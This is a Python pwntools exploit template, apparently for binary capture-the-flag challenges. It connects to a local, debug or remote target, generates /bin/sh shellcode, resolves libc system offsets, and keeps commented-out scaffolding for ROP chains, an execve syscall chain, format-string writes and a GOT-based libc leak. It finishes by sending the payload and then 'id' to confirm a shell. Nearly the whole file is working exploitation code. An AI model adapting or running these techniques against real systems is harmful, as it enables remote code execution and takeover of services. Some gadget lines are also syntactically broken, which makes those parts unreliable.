from pwn import *

def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    r.send(payload)
    return

def sendline_payload(payload):
    log.info("payload = %s" % repr(payload))
    r.sendline(payload)
    return

def print_address(s, addr):
	log.info(s + ' : ' + hex(addr))
	return

binary = './'
host ='exploitme.example.com'
port = 31337
libc = './'

elf = ELF(binary)
context.binary = binary
# context.log_level = 'debug'
# env={"LD_PRELOAD": libc}

'''
ssh = ssh(user='myria',host='sherlock.myria.break',port=1234,password='asdf')
r = ssh.process("./binary")
'''

if len(sys.argv) >= 2 and sys.argv[1] == 'r':
	# remote
	r = remote(host, port)
	libc = ELF(libc)
elif len(sys.argv) >= 2 and sys.argv[1] == 'd':
	# debug
	r = gdb.debug(binary)
	#  = gdb.debug(binary, env={"LD_PRELOAD" : libc})
	libc = elf.libc
else:
	# local
	r = process(binary)
	# r = process(binary, env={"LD_PRELOAD" : libc})
	libc = elf.libc

shellcode = asm(shellcraft.sh())
str_bin_sh = '/bin/sh\x00'
str_bin = '/bin'
str_sh = '/sh\x00'
nop = '\x90'

# ELF

# addr_plt_read = elf.plt['read']
# addr_got_read = elf.got['read']
# addr_plt_write = elf.plt['write']
# addr_got_write = elf.got['write']
# addr_plt_printf = elf.plt['printf']
# addr_got_printf = elf.got['printf']
# addr_plt_puts = elf.plt['puts']
# addr_got_puts = elf.got['puts']
# addr_plt_fgets = elf.plt['fgets']
# addr_got_fgets = elf.got['fgets']
# addr_plt_system = elf.plt['system']
# addr_symbols_main = elf.symbols['main']

# libc

offset_system = libc.symbols['system']
offset_str_bin_sh = next(libc.search('/bin/sh\x00'))
# offset_printf = libc.symbols['printf']
# addr_plt_fgets = elf.plt['fgets']
# offset_open = libc.symbols['open']
# offset_read = libc.symbols['read']
# offset_write = libc.symbols['write']
# offset_mmap = libc.symbols['mmap']
# offset_exit = libc.symbols['exit']

'''
Gadget
rp --file=binary --unique --rop=5

# elf

ret = elf.search(asm('ret')).next()
pop_rdi = elf.search(asm('pop rdi; ret')).next()
pop_rsi_r15 = elf.search(asm('pop rsi ; pop r15 ; ret')).next()
pop_rdx_r13 = elf.search(asm(pop rdx ; pop r13 ; ret))
pop_rax = elf.search(asm('pop rax; ret')).next()
syscall = elf.search(asm('syscall; ret'))

# libc

lbc_offset_ret = libc.search(asm('ret')).next()
lbc_offset_pop_rdx_rdi = libc.search(asm('pop rdx ; pop rsi ; ret')).next()
'''

print r.recvuntil(':')

'''
Format string attack

Example
AAAA %p %p %p %p %p %p %p

payload = ''
payload += 'AAAA'
payload += '%p' * 7

offset = 7
payload = fmtstr_payload(offset, {0x0:0xcafebabe}, numbwritten=0, write_size='byte')
payload = fmtstr_payload(offset, {0x0:0xcafebabe}, numbwritten=0, write_size='short')
sendline_payload(payload)
'''

'''
read
ssize_t read(int fd, void *buf, size_t count);

write
ssize_t write(int fd, const void *buf, size_t nbytes);

mmap
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);

32bit syscall
- instruction 0x80
- syscall number : eax
- execve number 11
- up to 6 inputs : ebx, ecx, edx, esi, edi, ebp

64-bit syscall
- instruction : syscall
- syscall number : rax
- execve number 59
- up to 6 inputs : rdi, rsi, rdx, r10, r8, r9
- ref:https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
'''

payload = ''
# payload += 'A' * 256

'''
payload += str_bin_sh
payload += b'A' * (256 - len(payload))
payload += pack(pop_rsi_r15)
payload += pack(0x0)
payload += pack(0x0)
payload += pack(pop_rdx_r13)
payload += pack(0x0)
payload += pack(0x0)
payload += pack(pop_rax)
payload += pack(59)
payload += pack(syscall)
'''

'''
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_got_printf)
payload += p64(addr_plt_printf)
payload += p64(ret)
payload += p64(elf.symbols['main'])
sendline_payload(payload)

leaked = u64(r.recv(6).rstrip().ljust(8,'\x00'))
print_address('printf_got', leaked)
libc_base = leaked - offset_printf
print_address('libc_base', libc_base)
'''

'''
rop = ROP(elf)
rop.call('read', [0, 0xdeadbeef, 4])
payload += rop.chain()
print rop.dump()
'''

sendline_payload(payload)

sendline_payload('id')
print r.recvall(timeout=2)

# sleep(1)
# r.interactive()